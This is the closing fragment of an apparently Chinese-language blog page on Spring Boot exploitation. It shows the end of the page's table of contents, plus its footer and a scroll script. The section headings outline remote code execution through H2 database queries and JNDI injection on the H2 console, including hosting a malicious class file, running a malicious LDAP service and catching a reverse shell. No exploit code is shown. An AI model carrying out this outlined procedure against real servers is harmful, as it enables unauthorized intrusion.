+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-5">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x06h2-database-query-rce">0x06：h2 database query RCE</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-10">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-9">利用方法：</a>
+<ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BE%E7%BD%AE-springdatasourcehikariconnection-test-query-%E5%B1%9E%E6%80%A7">步骤一：设置 spring.datasource.hikari.connection-test-query 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8">步骤二：重启应用</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-6">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-6">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x07h2-database-console-jndi-rce">0x07：h2 database console JNDI RCE</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-11">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-10">利用方法：</a>
+<ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BF%E9%97%AE%E8%B7%AF%E7%94%B1%E8%8E%B7%E5%BE%97-jsessionid">步骤一：访问路由获得 jsessionid</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81-2">步骤二：准备要执行的 Java 代码</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6-2">步骤三：托管 class 文件</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1-2">步骤四：架设恶意 ldap 服务</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-3">步骤五：监听反弹 shell 的端口</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E5%8C%85%E8%A7%A6%E5%8F%91-jndi-%E6%B3%A8%E5%85%A5">步骤六：发包触发 JNDI 注入</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-7">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-7">漏洞环境：</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://piaogexu.github.io/post/shu-ju-ku-gong-ji/">
+              <h3 class="post-title">
+                数据库攻击
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://piaogexu.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
